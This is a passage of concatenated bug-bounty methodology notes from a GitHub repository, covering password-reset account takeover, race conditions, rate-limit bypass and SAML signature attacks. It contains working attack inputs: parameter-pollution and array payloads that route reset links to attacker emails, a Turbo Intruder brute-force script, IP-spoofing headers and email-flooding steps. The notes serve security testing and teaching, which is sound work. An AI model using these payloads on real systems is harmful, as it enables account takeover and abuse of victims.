{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Password_Reset_Functionality/Account_Takeover_By_Password_Reset_Functionality.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Password_Reset_Functionality/Account_Takeover_By_Password_Reset_Functionality.md", "content": "\n```\n1. email= victim@gmail.com&email=attacker@gmil.com\n2. email= victim@gmail.com%20email=attacker@gmil.com\n3. email= victim@gmail.com |email=attacker@gmil.com\n4. email= victim@gmail.com%0d%0acc:attacker@gmil.com\n5. email= victim@gmail.com&code= my password reset token\n```\n### Authors\n\n@tamimhasan404\n", "timestamp": "2025-10-21T22:02:13.971383"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Password_Reset_Functionality/Password_Reset_Flaws_by_Sm4rty.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Password_Reset_Functionality/Password_Reset_Flaws_by_Sm4rty.md", "content": "# Common security flaws in password reset functionality compiled from twitter, writeups, disclosed reports:\n\n## 1. Password Reset Token Leak Via Referrer\n\n- The HTTP referer is an optional HTTP header field that identifies the address of the webpage which is linked to the resource being requested.\nThe Referer request header contains the address of the previous web page from which a link to the currently requested page was followed \n\nExploitation:\n```\n    Request password reset to your email address\n    Click on the password reset link\n    Dont change password\n    Click any 3rd party websites(eg: Facebook, twitter)\n    Intercept the request in burpsuite proxy\n    Check if the referer header is leaking password reset token.\n``` \n  \n## 2. Sending an array of email addresses instead of a single email address.\n\n- In this attack the The attacker can send a password reset link to an arbitrary email by sending an array of email addresses instead of a single email address and It could lead to full account takeover.\n\n```\nPOST https://example.com/api/v1/password_reset HTTP/1.1\nOriginal Request Body:\n{“email_address”:”xyz@gmail.com”}\nModified Request Body:\n{“email_address”:[“admin@breadcrumb.com”,”attacker@evil.com”]}\n```\n- In this way, the password reset link get send to both victim as well as attacker. And the attacker can use it to gain Full account Takeover.\n\n## 3. Bruteforcing OTP for Reseting Password.\n\n- Now, In case The password reset functionality of application is based on OTP validation.\n- Many program accepts No rate limit as acceptable risk. So, Bruteforcing OTP is worth trying.\n- You can reset the password of an account by intercepting the request for OTP validation and bruteforcing the 6 digit number.\n- Using this, it is possible to change and reset the password of any account, by changing the user data and brute-forcing the reset OTP.\n  \nExploitation:\n```\n      1. Start the Burp Suite and Intercept the password reset request\n      2.Send to intruder\n      3.Use null payload\n```\n\n## 4. Full Account Takeover via Changing Email And Password of any User through API Parameters\n\nExploitation:\n```\n    1. Attacker have to login with their account and Go to the Change password function\n    2. Start the Burp Suite and Intercept the request\n    3. After intercepting the request sent it to repeater and modify parameters Email and Password\n      POST /api/changepass\n      [...]\n      (\"form\": {\"email\":\"victim@email.tld\",\"password\":\"12345678\"})\n```      \n      \n      \n## 5. Response manipulation: Replace Bad Response With Good One\n\n- Look for Request and Response like these\n```\nHTTP/1.1 401 Unauthorized\n(“message”:”unsuccessful”,”statusCode:403,”errorDescription”:”Unsuccessful”)\n```\n- Change Response\n```\nHTTP/1.1 200 OK\n(“message”:”success”,”statusCode:200,”errorDescription”:”Success”)\n```\n", "timestamp": "2025-10-21T22:02:14.072153"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Password_Reset_Functionality/Password_Reset_Token_Leakage.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Password_Reset_Functionality/Password_Reset_Token_Leakage.md", "content": "Password Reset Token Leakage\n    \n    Steps:\n    1.Sent a password reset request using forget password\n\t2.Check your email \n\t3.copy your reset page link and paste in another tab and make burp intercept on.\n\t4.Look for every request if you find similiar token that is in reset link with other domain like: bat.bing.com or facebook.com\n\t5.Than there is reset password token leakage.\n\n### Authors\n\n* [@Virdoex_hunter](https://twitter.com/Virdoex_hunter)\n", "timestamp": "2025-10-21T22:02:14.174318"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Password_Reset_Functionality/Top_5_Password_Reset_Bugs.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Password_Reset_Functionality/Top_5_Password_Reset_Bugs.md", "content": "# 🔒 Common Security Flaws in Password Reset Functionality\n\n*A comprehensive compilation of password reset vulnerabilities from Twitter, bug bounty writeups, and disclosed security reports.*\n\n---\n\n## 1. 🔗 Password Reset Token Leak Via Referrer\n\n### Overview\nThe HTTP Referer header is an optional HTTP header field that identifies the address of the webpage which linked to the resource being requested. This header contains the address of the previous web page from which a link to the currently requested page was followed.\n\n### 🎯 Exploitation Steps\n1. **Request password reset** to your email address\n2. **Click on the password reset link** received in email\n3. **Don't change the password** - leave the reset page open\n4. **Click any 3rd party websites** (e.g., Facebook, Twitter) from the reset page\n5. **Intercept the request** in Burp Suite proxy\n6. **Check if the Referer header** is leaking the password reset token\n\n### ⚠️ Impact\nToken exposure through referrer headers can lead to account takeover if malicious third-party sites capture these tokens.\n\n---\n\n## 2. 📧 Array Injection in Email Parameter\n\n### Overview\nThis vulnerability occurs when the application accepts an array of email addresses instead of a single email address for password reset requests, potentially sending reset links to multiple recipients including attackers.\n\n### 🎯 Exploitation Example\n\n**Original Request:**\n```http\nPOST https://example.com/api/v1/password_reset HTTP/1.1\nContent-Type: application/json\n\n{\"email_address\":\"victim@gmail.com\"}\n```\n\n**Modified Request:**\n```http\nPOST https://example.com/api/v1/password_reset HTTP/1.1\nContent-Type: application/json\n\n{\"email_address\":[\"victim@breadcrumb.com\",\"attacker@evil.com\"]}\n```\n\n### ⚠️ Impact\nThe password reset link gets sent to both the victim and the attacker, enabling **Full Account Takeover**.\n\n---\n\n## 3. 🔢 OTP Brute Force Attack\n\n### Overview\nWhen password reset functionality relies on OTP (One-Time Password) validation without proper rate limiting, attackers can brute force the OTP to gain unauthorized access.\n\n### 🎯 Exploitation Steps\n1. **Start Burp Suite** and intercept the password reset request\n2. **Send the request to Intruder**\n3. **Configure payload positions** for the OTP field\n4. **Use number payload** (000000-999999 for 6-digit OTP)\n5. **Launch the attack** to brute force valid OTP\n\n### ⚠️ Impact\nSuccessful OTP brute force can lead to unauthorized password reset and complete account compromise.\n\n---\n\n## 4. 🔄 Account Takeover via API Parameter Manipulation\n\n### Overview\nThis vulnerability occurs when change password API endpoints don't properly validate user authorization, allowing attackers to change passwords for arbitrary users by manipulating email parameters.\n\n### 🎯 Exploitation Steps\n1. **Login with attacker account** and navigate to change password function\n2. **Start Burp Suite** and intercept the password change request\n3. **Send request to Repeater** and modify the email parameter to target victim\n4. **Execute the request** with victim's email and attacker's chosen password\n\n**Example Request:**\n```http\nPOST /api/changepass HTTP/1.1\nContent-Type: application/json\n\n{\n  \"email\": \"victim@email.tld\",\n  \"password\": \"attackerPassword123\"\n}\n```\n\n### ⚠️ Impact\nDirect account takeover by changing victim's password without authorization.\n\n---\n\n## 5. 🔀 Response Manipulation Bypass\n\n### Overview\nSome applications rely solely on client-side response validation, allowing attackers to manipulate error responses to bypass security controls.\n\n### 🎯 Exploitation Technique\n\n**Original Response:**\n```http\nHTTP/1.1 401 Unauthorized\nContent-Type: application/json\n\n{\n  \"message\": \"unsuccessful\",\n  \"statusCode\": 403,\n  \"errorDescription\": \"Unsuccessful\"\n}\n```\n\n**Modified Response:**\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"message\": \"success\",\n  \"statusCode\": 200,\n  \"errorDescription\": \"Success\"\n}\n```\n\n### ⚠️ Impact\nBypasses client-side validation and may grant unauthorized access to password reset functionality.\n\n---\n\n## 🛡️ Mitigation Strategies\n\n- **Implement proper rate limiting** for OTP attempts\n- **Use secure token generation** with sufficient entropy\n- **Validate user authorization** before allowing password changes\n- **Implement server-side validation** instead of relying on client responses\n- **Sanitize and validate** all input parameters including arrays\n- **Use secure referrer policies** to prevent token leakage\n\n---\n\n## 📚 Additional Resources\n\nFor more detailed analysis and real-world examples, check out this comprehensive blog post: \n**[Hunting for Bugs in Password Reset Feature - 2021](https://sm4rty.medium.com/hunting-for-bugs-in-password-reset-feature-2021-3def1b391bef)**\n\n---\n\n*Happy Bug Hunting! 🐛🔍*\n", "timestamp": "2025-10-21T22:02:14.381645"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Race_Condition/race_conditions.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Race_Condition/race_conditions.md", "content": "# RACE CONDITIONS\r\n## What is Race conditions ? \r\n - Race conditions are a common type of vulnerability closely related to business [logic flaws](https://portswigger.net/web-security/logic-flaws). \r\n - They occur when websites process requests concurrently without verifying. This can lead to multiple distinct threads interacting with the same data at the same time, resulting in a \"collision\" that causes unintended behavior in the application.\r\n\r\n <hr>\r\n \r\n## Limit over run RC (Exploiting Logic Flaws) \r\n- There are some basic RC tests that you can try in the context of Logic Flaws.\r\n  - Invite user\r\n  - Joining a group\r\n  - Like, subscribe, follow, unfollow, Vote ..etc that required limit. \r\n\r\n### This method required Burp version 2023.9.x or higher (This is the easiest method to exploit, you can create your own script also.)\r\n1 - Send the request to repeater for `'n' no. of times`.\r\n\r\n2 - Create a Tab for all those request and choose `Send Parallel (single Packet Attack)`\r\n\r\n3 - Hit send , if application is Vulnerable, you'll see the magic.\r\n<hr>\r\n\r\n## Rate-Limit Bypass via RC\r\n\r\n1 - Select the parameter in request that you want to bruteforce(let's say password), and `send the request into TurboIntruder`.\r\n\r\n2 - If it is password or something , then wordlist should be copied in your clipboard that and use the below python script in Turbo Intruder.\r\n\r\n```\r\ndef queueRequests(target, wordlists):\r\n\r\n    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack\r\n    engine = RequestEngine(endpoint=target.endpoint,\r\n                           concurrentConnections=1,\r\n                           engine=Engine.BURP2\r\n                           )\r\n    \r\n    # assign the list of candidate passwords from your clipboard\r\n    passwords = wordlists.clipboard\r\n    \r\n    # queue a login request using each password from the wordlist\r\n    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked\r\n    for password in passwords:\r\n        engine.queue(target.req, password, gate='1')\r\n    \r\n    # once every request has been queued\r\n    # invoke engine.openGate() to send all requests in the given gate simultaneously\r\n    engine.openGate('1')\r\n\r\ndef handleResponse(req, interesting):\r\n    table.add(req)\r\n```\r\n\r\n3 - Hit Attack and see the magic.\r\n\r\n<hr>\r\n\r\n## Multi-Endpoint Race Conditions\r\n\r\n1 - When a single functionality chains with multiple request , eg - `Buying a product from a E-Commerce application`\r\n\r\n    - /product --> for the product\r\n    - /cart    --> Add to cart that product\r\n    - /cart/checkout  --> Buy that product\r\n\r\n2 - Send all the required request into burp repeater for the product you want in a sequence and create a Tab.\r\n\r\n3 - Select `Send Parallel (single Packet Attack)` and hit send.\r\n\r\n<hr>\r\n\r\n##  Single Endpoint RaceCondition\r\n\r\n - If you've facing a functionality where new objects edit the older object and require email verification, then we can test there for RaceConditions, Eg. Email Change functionality\r\n\r\n       `Account A : Attacker --> attacker@email.com` \r\n       `Account B : Victim --> victim@email.com`\r\n\r\n1 - Application has email change functionality, where the new requested email is updated over older email, and send the confirmation link to the user email address.\r\n  \r\n2 - Since, email is updated in DataBase and only confirmation is needed, \r\n   \r\n3 - So we `Send Parallel (Single Packet Attack)` of the changing email for,\r\n```\r\nattacker@email.com\r\nvictim@email.com\r\n```\r\n4 - In Backend, Because we request so much fast that when application server generate confirmation link for `attacker@email.com` at the same time `victim@email.com` request is also reach their and application got confused to prioritise , As a result it sends both confirmation links on the same email.\r\n\r\n5 - Impact : This will lead to Full Acount Takeover.\r\n\r\n<hr>\r\n\r\n## Time Sensitive Vulnerabilities\r\n1 - Send two parallel `forget password` request for `Attacker i..e Account-A`\r\n\r\n2 - If both `password reset links contains same token`, then we can test their for ATO.\r\n\r\n3 - This time send both request again by `changing victim's username/password in one of them`.\r\n\r\n4 - Analyze the response time, if `both request have same response time`, then their might be chances of ATO\r\n\r\n<hr><hr>\r\n\r\n# REAL World Cases : (H1 reports)\r\n\r\n### 1 - Race condition in flag submission\r\n   - [Found in --> HackerOne](https://hackerone.com/reports/454949)\r\n   - Report describes a Race Condition Vulnerability which `allow an authenticated user to submit the same ctf Flag multiple times`. Increasing the user points and therefore the chances to get an invitation to a private program.\r\n\r\n### 2 - Race condition on Invite user action\r\n   - [Found in --> Omise](https://hackerone.com/reports/1285538)\r\n   - Race condition vulnerability which `allows the invitation of the same member multiple times to a single team` via the dashboard.\r\n\r\n### 3 - Race condition in performing retest allows duplicated payments\r\n   - [Found in --> HackerOne](https://hackerone.com/reports/429026)\r\n   - By executing `multiple requests to confirm a retest at the same time`, a malicious user is paid multiple times for the retest. This `allows for stealing money from HackerOne`, which could go unnoticed by both HackerOne and the attacker.\r\n\r\n### 4 - Race Condition leads to Un-Deletable group member\r\n   - [Found in --> HackerOne](https://hackerone.com/reports/604534)\r\n   - Small Race condition bug in which a group `user couldn't be removed from the group even by the admin` after they join.\r\n\r\n### 5 - Race Condition when following a user\r\n   - [Found in --> every.org](https://hackerone.com/reports/927384)\r\n   - Race condition vulnerability when following a user. If you send the Follow requests asynchronously, you can `follow a user multiple times instead getting an error message`.\r\n\r\n### 6 - Race Conditions in Popular reports feature.\r\n   - [Found in --> HackerOne](https://hackerone.com/reports/146845)\r\n   - This report describes a race condition bug which `allow an authenticated user to upvote or downvote multiple times a single report`, increasing its counter (and its rank on the hacktivity page).\r\n\r\n### 7 - Race condition in joining CTF group\r\n   - [Found in --> HackerOne](https://hackerone.com/reports/1540969)\r\n   - A race condition in https://ctf.hacker101.com/group/join `allows a user to join the same CTF group multiple times`.The user will show up in the group member list multiple times, and affect the group statistics.\r\n\r\n### 8 - Race conditions can be used to bypass invitation limit\r\n   - [Found in --> KeyBase](https://hackerone.com/reports/115007)\r\n   - Using Race conditions, attacker was `able to send out a total of 7 invites to his throwaway emails, obviously bypassing the 3 no. of invitations limit`.\r\n\r\n### 9 - Race Condition allows to redeem multiple times gift cards.\r\n   - [Found in --> Reverb.com](https://hackerone.com/reports/759247)\r\n   - I've found a Race Condition vulnerability which `allows to redeem gift cards multiple times`. This how an attacker can easily buy stuff just buying one gift card and redeem it over and over again.\r\n", "timestamp": "2025-10-21T22:02:15.365178"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Rate_limit/No Rate-Limit on Verify-PhoneNo.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Rate_limit/No%20Rate-Limit%20on%20Verify-PhoneNo.md", "content": "## Flaw-Name : Unlimited SMS Triggering\r\n---\r\n### Steps To Reproduce \r\n- 1 - Open this url `https://target.com/phone-number-verify`\r\n- 2 - Enter the `victim's mob. number`\r\n- 3 - `Intercept the request` and send the request to intruder\r\n- 4 - Use payload type as `NULL payloads` and set the payload count & `start attack`\r\n---\r\n### Impact : \r\n- If the company is using any email service software API(such as AWS,GCP..etc) or some tool that has been bought for the emails being sent on the support domain, the rate limit can result in `financial loss` and it can also `slow down your services` as huge/mass mails will `lead to disruption of data` that original user might send or the quota that has been bought might be exhausted.\r\n---\r\n### Mitigation - \r\n\r\n- 1 - IP Based Blocking\r\n- 2 - Captcha\r\n- 3 - Firewall\r\n- 4 - Reducing the number of API requests\r\n", "timestamp": "2025-10-21T22:02:15.934950"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Rate_limit/No Rate-limit on Invite User.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Rate_limit/No%20Rate-limit%20on%20Invite%20User.md", "content": "## Flaw-Name : No rate limit on invite user leads to email triggering\r\n---\r\n\r\n### Description : \r\n- Rate limiting is a strategy for limiting network traffic. It puts a cap on how often someone can repeat an action within a certain timeframe – for instance, trying to log in to an account.\r\n\r\n---\r\n### Steps To Reproduce \r\n- 1 - Go to `https://target.com/`\r\n- 2 - Navigate to `Invite User` option and Enter the `victim's email` \r\n- 3 - Send invite & `Intercept` the Request\r\n- 4 - Send the request to `Intruder` & clear payload positions\r\n- 5 - Apply payload type as `null payload` and payload count as 100\r\n- 5 - Click on `Start attack` after applying the threads\r\n- 6 - The victim will get huge number of emails\r\n---\r\n### Impact : \r\n- If the company is using any email service software API(such as AWS,GCP..etc) or some tool that has been bought for the emails being sent on the support domain, the rate limit can result in `financial loss` and it can also `slow down your services` as huge/mass mails will `lead to disruption of data` that original user might send or the quota that has been bought might be exhausted.\r\n---\r\n### Mitigation - \r\n\r\n- 1 - IP Based Blocking\r\n- 2 - Captcha\r\n- 3 - Firewall\r\n- 4 - Reducing the number of API requests\r\n", "timestamp": "2025-10-21T22:02:16.034822"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Rate_limit/No Rate-limit on Promo.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Rate_limit/No%20Rate-limit%20on%20Promo.md", "content": "## No Rate-Limit on Promo\r\n\r\n### Steps To Reproduce:\r\n- 1) Go to URL - `https://abc.target.com/product/121/checkout/promo`\r\n- 2) Navigate to `Offer/Promo/Coupon code` option\r\n- 3) Enter the random digit\r\n- 4) `Intercept the Request` and Send to intruder\r\n- 5) Apply payload & `Start attack`\r\n\r\n### Impact : \r\n- Financial Loss, an attacker can easily bruteforce all promo/coupon/Offer codes.", "timestamp": "2025-10-21T22:02:16.133073"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Rate_limit/No Rate-limit on Verify-email.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Rate_limit/No%20Rate-limit%20on%20Verify-email.md", "content": "## Flaw-Name : Unlimited Email Triggering\r\n---\r\n### Steps To Reproduce :\r\n- 1 - Navigate to : `https://abc.target.com/verify-email`\r\n- 2 - `Intercept` the request in BurpSuite\r\n- 3 - Send the request to `Intruder` and clear the payload position\r\n- 4 - Use `Null payloads` as payload type and set the payload count to 100\r\n- 5 - `Start attack`\r\n\r\n---\r\n### Impact : \r\n- If the company is using any email service software API or some tool that has been bought for the emails being sent on the support domain, the rate limit can result in `financial loss` and it can also `slow down your services` as huge/mass mails will `lead to disruption of data` that original user might send or the quota that has been bought might be exhausted.\r\n---\r\n### Mitigation :\r\n\r\n- 1 - IP Based Blocking\r\n- 2 - Captcha\r\n- 3 - Firewall\r\n- 4 - Reducing the number of API requests\r\n", "timestamp": "2025-10-21T22:02:16.239255"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Rate_limit/No Rate-limit on forget-password.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Rate_limit/No%20Rate-limit%20on%20forget-password.md", "content": "## Flaw-Name : No rate limit on forget/reset password leads to email triggering\r\n---\r\n### Steps To Reproduce \r\n- 1 - Navigate to : `https://abc.target.com/forgot-password` or it could be `https://abc.target.com/reset-password`\r\n- 2 - Enter the email of the victim\r\n- 3 - `Intercept` the request in burp suite\r\n- 4 - Send the request to the `Intruder` and clear payload positions\r\n- 5 - Use `Null payloads` and set the payload count to 100\r\n- 6 - `Start attack`\r\n\r\n\r\n---\r\n### Impact : \r\n- If the company is using any email service software API or some tool that has been bought for the emails being sent on the support domain, the rate limit can result in `financial loss` and it can also `slow down your services` as huge/mass mails will `lead to disruption of data` that original user might send or the quota that has been bought might be exhausted.\r\n---\r\n### Mitigation :\r\n\r\n- 1 - IP Based Blocking\r\n- 2 - Captcha\r\n- 3 - Firewall\r\n- 4 - Reducing the number of API requests", "timestamp": "2025-10-21T22:02:16.345694"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Rate_limit/RateLimitBypass.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Rate_limit/RateLimitBypass.md", "content": "# Rate Limit Bypass Techniques \n## There are two ways to do that \n- Customizing HTTP Methods\n- Adding Headers to Spoof IP\n\n## 1. Customizing HTTP Methods\n- If the request goes on GET try to change it to POST, PUT, etc.,\n- If you wanna bypass the rate-limit in API's try HEAD method.\n\n## Rate Limit Bypass using Header \n\nUse the following Header just Below the Host Header \n\n```\nX-Forwarded-For: IP\nX-Forwarded-IP: IP\nX-Client-IP: IP\nX-Remote-IP: IP\nX-Originating-IP: IP\nX-Host: IP\nX-Client: IP\n\n#or use double X-Forwarded-For header\nX-Forwarded-For:\nX-Forwarded-For: IP\n```\n## Adding HTTP Headers to Spoof IP and Evade Detection\n- These are Headers I've collected so far to Bypass Rate-Limits.\n```\nX-Forwarded: 127.0.0.1\nX-Forwarded-By: 127.0.0.1\nX-Forwarded-For: 127.0.0.1\nX-Forwarded-For-Original: 127.0.0.1\nX-Forwarder-For: 127.0.0.1\nX-Forward-For: 127.0.0.1\nForwarded-For: 127.0.0.1\nForwarded-For-Ip: 127.0.0.1\nX-Custom-IP-Authorization: 127.0.0.1\nX-Originating-IP: 127.0.0.1\nX-Remote-IP: 127.0.0.1\nX-Remote-Addr: 127.0.0.1\n```\n\n## Rate Limit Bypass using Special Characters \n\n- Adding Null Byte ( %00 ) at the end of the Email can sometimes Bypass Rate Limit.\n- Try adding a Space Character after a Email. ( Not Encoded )\n- Some Common Characters that help bypassing Rate Limit : %0d , %2e , %09 , %20 , %0, %00, %0d%0a, %0a, %0C\n- Adding a slash(/) at the end of api endpoint can also Bypass Rate Limit. `domain.com/v1/login` -> `domain.com/v1/login/`\n\n\n## Using IP Rotate Burp Extension\n\n- Try changing the user-agent, the cookies... anything that could be able to identify you\n- If they are limiting to 10 tries per IP, every 10 tries change the IP inside the header.\n  Change other headers\n- Burp Suite's Extension IP Rotate works well in many cases. Make sure you have Jython installed along.\n\n- Here You'll everything you need - https://github.com/PortSwigger/ip-rotate\n\n\n## You can find some more here - [Check this out](https://medium.com/bugbountywriteup/bypassing-rate-limit-like-a-pro-5f3e40250d3c)\n## You can find more with screenshot https://medium.com/@huzaifa_tahir/methods-to-bypass-rate-limit-5185e6c67ecd\n\n# Reference\n* https://twitter.com/m4ll0k2/status/1294983599943540738/photo/1\n* https://twitter.com/SalahHasoneh1/status/1287366496432332800\n* https://twitter.com/SMHTahsin33/status/1295054667613757441 (all in one must check)\n\n# Authors:  \n* [Keshav Malik](https://www.linkedin.com/in/keshav-malik-22478014a) </br>\n* [0xd3vil](https://linkedin.com/in/0xd3vil) </br>\n* [Virdoex_hunter](https://twitter.com/Virdoex_hunter)\n* [@0xCyberPirate](https://twitter.com/0xCyberPirate)\n", "timestamp": "2025-10-21T22:02:16.551006"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "SAML/SAML.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/SAML/SAML.md", "content": "# SAML\n- **Single Sign-on (SSO) is an authentication service that allows users to utilize a single set of credentials to access multiple applications. Security Assertion Markup Language (SAML) is one of the ways one can implement SSO.**\n- **Security Assertion Markup Language (SAML) is a markup language implemented in XML.**\n- **SAML messages are base64 encoded but that is easily decoded to view the message contents.**\n- **SAML and OAuth are different protocols and are used for different purposes, OAuth is a protocol for authorization while SAML is a protocol for authentication.**\n\n# How it Works:\n\n- SAML enables SSO by managing the interaction between three parties: The user(**SAML Assertion**), the identity provider, and the service provider\n\n```python\n1. SAML Assertion:An XML message that contains information about the user’s identity and potentially other user attributes.\n2. Identity Provider (IdP): The service performing the authentication and issuing the Assertion. Authentication can be any number of things from username/password to 2FA.\n3. Service Provider (SP): The web application that the user wants to access.\n```\n\n![Capture JPG](https://user-images.githubusercontent.com/33719912/157280386-aecedbe9-55d9-49fb-aa20-afc31393c5f9.jpg)\n\n\n# Attacks:\n\n1. **XML SIGNATURE WRAPPING (XSW):** \n- The basic premise behind XSW is that XML documents containing XML Signatures may be processed in two separate steps: once for the validation of the digital signature, and once for the real application that uses the XML data. Consider the following two steps and the methods used to arrive at a single XML element:\n- XML Signature Validation\n    - The application locates the **`<ds:Signature>`**’s **`<ds:Reference>`** element\n    - The application uses the **`<ds:Reference>`**’s **`URI`** attribute to determine which XML element is signed\n    - The application (in)validates the signed XML element\n- After validation, the same application attempts to use the signed data as part of its normal operation.\n    - The application’s XML parser locates its desired XML element using top-down tree-based navigation\n\n```python\n- Signature wrapping attacks bypass signature validation of Sam'l assertions. This is done because the service provider does not check for multiple assertions. By sending more than one assertion within a SAML message, we're able to confuse the service provider. We are able to have our valid assertion pass through with an Invalid assertion that then assumes the identity of another user when engaged with a penetration test involving SAML. Make sure you ask your client contact for an extra username which is valid on the system for testing purposes. You won't need the credentials for this user, but you do need another user name that is valid.\n- When multiple assertion bodies are provided to the service provider with a signature wrapping attack, after the identity provider authenticated our user, we are able to confuse the service provider and then we are able to gain access to the additional users account that we provided in this case Admin.\n\n- There are total 8 types XSW attacks. (All of them can be easily done using SAMLRaider)\n\n# Steps to Perform XSW Attacks:\n1. Login to SSO\n2. Intercept the request were you can see SAML Assertions in SAML Raider\n3. Try every XSW attacks that SAML Raider offers by clicking \"Apply XSW\" button.\n4. Once you see XSW attack applied in SAML Raider change the top assertion value to you desire account\n5. Now Forward it through.\n6. Done, Check if you are logged in as the victim.\n\nReference: https://www.youtube.com/watch?v=ALakvKDsZLo  \n```\n\n```python\n**Key Note:** XSW #2, XSW #1, manipulates SAML responses. The only two that deal with Responses are XSW #1 and XSW #2.\n\nXSW Attack #1\n- XSW #1 tampers with SAML responses. It accomplishes this by producing a copy of the SAML Response and Assertion, then inserting the original Signature as a child element of the copied Response into the XML. The assumption is that following signature validation, the XML parser identifies and utilises the copied Response at the top of the document rather than the original signed Response.\nXSW Attack #2\n- The primary distinction between #1 and #2 is that XSW #2 uses a detachable signature, whereas XSW #1 uses an enveloping signature. The malicious Response's position remains unchanged.\n\n**Key Note:** XSW #4 is similar to #3 they play with Assertion element.\n\nXSW Attacks #3\n- The first example of an XSW that wraps the Assertion element is XSW #3. The cloned Assertion is inserted as the first child of the root Response element by SAML Raider. The replicated Assertion is a sibling of the original Assertion.\nXSW Attakcs #4\n- XSW #4 is similar to #3, except that the original Assertion becomes a child of the duplicated Assertion in this case.\n\n**Key Note:** XSW #5 and #6 are similar and deals with Assertion Wrapping\n\nXSW Attack #5\n- XSW #5 is the first example of Assertion wrapping in which the Signature and the original Assertion are not in one of the three typical configurations (enveloped/enveloping/detached). The duplicated Assertion encircles the Signature in this example.\nXSW Attack #6\n- XSW #6 places its duplicated Assertion in the same spot as #s 4 and 5. The copy of the Assertion envelopes the Signature, which in turn envelopes the original Assertion.\n\n**Key Note:** \n- Extensions is a valid XML element with a broader schema specification. This technique was created in response to the OpenSAML library by the authors of this white paper. To accurately compare the ID used during signature validation to the ID of the processed Assertion, OpenSAML employed schema validation. The authors discovered that if copied Assertions with the same ID as the original Assertion were children of an element with a less restrictive schema definition, they might avoid this countermeasure.\n- XSW attack #7 and #8\n\nXSW Attack #7\n- XSW #7 inserts an Extensions element and adds the copied Assertion as a child.\nXSW Attack #8\n- XSW #8 use a less restrictive XML element to execute a variant of the attack pattern employed in XSW #7. Instead of the copied Assertion, the original Assertion is the child of the less restrictive element this time.\n```\n\n2. **XML SIGNATURE EXCLUSION:**\n- Signature Exclusion is used to test how the SAML implementation behaves when there is no Signature element.\n- When a Signature element is absent the signature validation step may get skipped entirely.\n\n```python\n# Steps to Perform:\n1. Intercept SAML response.\n2. Open SAMLRaider and click \"Remove Signatures\" button\n3. Forward the request.\n4. If not error from SP (Service Provider) then try tampering attribute like UserID.\n5. Done!, check if you are in Vitim Account.\n\n# Other Signature Attacks:\n- Predictable signature\n- Use of encryption with a weak signature\n\n```\n\n3. **CERTIFICATE FAKING:**\n- Certificate faking is the process of testing whether or not the Service Provider verifies that a trusted Identity Provider signed the SAML Message.\n\n```python\n# Steps to Perform:\n1. Intercept SAML response in SAMLRaider.\n2. If there is a Signature included in the Response, use the \"Send Certificate to SAML Raider Certs\" button.\n3. After sending the certificate, we should see an imported certificate in the SAML Raider Certificates tab.\n4. We highlight the imported cert and press the \"Save and Self-Sign\" button.\n5. Back to Burp Proxy SAML Raider\n6. First, select the new self-signed cert from the XML Signature dropdown menu.\n7. Then use the \"Remove Signatures\" button to remove any existing signatures.\n8. Finally, use the \"(Re-)Sign Message\" or \"(Re-)Sign Assertion button\"\n9. After signing the message with the self-signed cert, send it on its way.\n\n- If we authenticate, we know that we can sign our SAML Messages. \n- The ability to sign our SAML Messages means we can change values in the Assertion and they will be accepted by the Service Provider.\n```\n\n4. **TOKEN RECIPIENT CONFUSION:**\n- Token Recipient Confusion tests whether or not the Service Provider validates the Recipient.\n- The Recipient field is an attribute of the SubjectConfirmationData element, which is a child of the Subject element in a SAML Response.\n- The Recipient attribute found on the SubjectConfirmationData element is a URL that specifies the location to which the Assertion must be delivered. If the Recipient is a different Service Provider than the one who receives it, the Assertion should not be accepted.\n\n```python\n# Pre-requisite:\n- Have a Legit account on a SP to use the token we get from SP on Target-SP and both SP's should use Same IdP.\n\n# Steps to Peform:\n1. Get Token From Legit-SP\n2. Try Same on Target-SP\n3. If successful you will be able to access Target-SP resource.\n\n#Exploitation Example:\nExploit 1: Suppose that SP SA  (Developer Department) and Starget (Sales Department) are accepting tokens from the same IdP, and the attacker does not have access to Starget .\nThe attacker (e.g. a worker in the developer team) does, however, have a legitimate account on SA, thus he can request a token from the IdP for this service. By sending tA to Starget (instead of SA ), the attack is performed. It is considered successful if tA is accepted by Starget; the attacker is thus logged in with the same account name as he has for SA and gets access to Starget's corresponding resources.\n\nExploit 2: Alternatively, the attacker can set up his own SP (Sbad ) offering some service for registered users (e.g., a weather forecast). To authenticate to Sbad, SSO is used and the attacker specifically federates it with the same IdP used by Starget . After that, the attacker lures the victim (a legitimate user of Starget ) to register with and authenticate to Sbad. Instead of or in addition to its usual service (weather forecast), Sbad stores all tokens in a database so that the attacker can access them. The attacker can then try to use the tokens to log in on Starget as the victim. The attack is considered successful, if an authentication token tbad issued for the victim for service Sbad is successfully verified on Starget .\n```\n\n5. **MISCELLANEOUS ATTACKS:**\n\n```python\n#. Simply Change Assertion Value to Victim:\n1. Intercept SAML Response in SAML Raider\n2. Change the User parameter or id to other user.\n\t\tExample: user@email.com to admin@email.com\n3. Done, Forward the Request.\n\n# SAML: Comment Injection I\n1. Find Registeration page for SP\n2. Use comment in payload like 